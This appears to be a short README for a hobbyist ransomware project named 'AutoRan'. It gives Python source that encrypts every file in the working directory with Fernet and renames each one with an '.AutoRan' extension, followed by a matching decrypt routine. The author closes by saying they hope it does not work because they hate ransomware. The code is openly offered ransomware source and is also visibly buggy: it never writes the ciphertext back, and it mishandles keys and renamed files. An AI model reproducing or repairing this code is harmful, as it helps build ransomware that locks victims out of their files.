# AutoRan
### AutoRan history 1.0
##### Encrypt Source Code

```
from cryptography.fernet import Fernet

Encrypt = {}
Files = glob.glob("*.*")

Key = Fernet.generate_key()
F = Fernet(Key)

def Encry():
  try:
    for File in Files:
      with open(File, "r") as fp:
        Data = fp.read()
        Locked = F.encrypt(Data)
        Encrypt[File] = Locked
        os.rename(File, f"{File}.AutoRan")
        FL.insert(END, f"{File} -> {File}.AutoRan")
        fp.close()
  except:
    pass
```

#### Decrypt Source Code

```
from cryptography.fernet import Fernet

Encrypt = {}
Files = glob.glob("*.*")

Key = Fernet.generate_key()
F = Fernet(Key)

def Decry():
  try:
    for LockData in Encrypt:
      with open(LockData, "w") as fp:
        Data = Encrypt[LockData]
        UnLocked = F.decrypt(Data).decode()
        fp.write(UnLocked)
  except:
    pass
```

#### Use cryptography.fernet
# I hope this program not work
#### cause i hate ransomware...
